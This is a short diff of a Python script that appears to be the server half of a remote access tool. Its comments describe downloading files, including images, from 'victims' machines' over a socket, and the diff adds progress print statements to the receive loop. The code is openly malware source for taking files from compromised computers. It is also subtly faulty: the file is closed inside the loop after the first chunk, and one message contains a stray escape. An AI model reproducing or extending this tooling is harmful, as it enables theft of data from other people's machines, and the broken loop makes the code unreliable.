@@ -65,14 +65,18 @@ def download_file(file_name):
     # As long as there's something in chunk variable
     while chunk:
         # Writing the chunk into file
+        print(f'Writing file to Server locally in chuncks...')
         f.write(chunk)
         try:
             chunk = target.recv(1024)
+            print(f'This Server has received 1024 bytes...')
         # If there's any errors => reached End of file
         except socket.timeout as e:
+            print(f'This Server has received all bytes\nThere\'s no more chunks in queue\hExiting...')
             break
         target.settimeout(None)
         # Close file upon complete sending files from victims
+        print(f'Closing Socket connections...')
         f.close()
 
 # SERVER download complicated files e.g. images from victims' machines
